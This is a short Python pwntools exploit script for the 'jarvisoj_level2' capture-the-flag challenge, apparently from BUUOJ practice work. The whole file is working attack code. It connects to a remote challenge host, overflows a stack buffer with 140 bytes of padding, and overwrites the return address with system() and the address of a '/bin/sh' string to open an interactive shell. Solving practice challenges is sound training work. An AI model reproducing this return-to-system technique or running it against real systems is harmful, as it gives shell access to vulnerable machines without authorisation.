from pwn import *


def jarvisoj_level2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level2'):
    target = remote('node5.buuoj.cn', 27686)
    target_elf = ELF(file_name)

    system_plt = p32(target_elf.plt['system'])
    bin_sh_str = p32(next(target_elf.search(b'/bin/sh')))

    payload = b'A' * 140
    # system('/bin/sh')
    payload += system_plt + p32(0xdeadbeef) + bin_sh_str

    target.sendlineafter('Input:', payload)

    target.interactive()


if __name__ == '__main__':
    jarvisoj_level2()
